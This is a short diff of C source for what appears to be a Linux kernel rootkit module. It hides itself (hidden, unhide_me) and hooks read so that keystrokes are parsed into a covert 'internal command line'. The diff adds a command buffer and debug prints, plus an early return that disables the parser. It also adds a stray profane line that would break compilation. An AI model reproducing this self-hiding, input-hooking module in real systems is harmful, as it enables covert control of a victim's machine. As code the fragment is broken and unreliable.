@@ -25,6 +25,10 @@ int hidden = 0;
 
 struct list_head tos;
 
+// stuff for "internal command line"
+char internal_cl[2048];
+int  cl_pos = 0;
+
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
@@ -69,6 +73,9 @@ void unhide_me(void)
 }
 
 static void handleChar(char c){
+    OUR_DEBUG("hooked read!!!!!!!\n");
+
+    return;
     if(c=='\n' || c == '\r'){ //cancel command with newline
 //        OUR_DEBUG("newline");
         last_match = -1;
@@ -118,6 +125,7 @@ static void handleChar(char c){
 static void handle_input(char *buf, int count)
 {
     int i;
+    OUR_DEBUG("handle_input\n");
     for(i = 0; i<count; i++){
         handleChar(buf[i]);
     }
@@ -167,7 +175,7 @@ static int __init _init_module(void)
 
     return 0;
 }
-
+fuck you
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
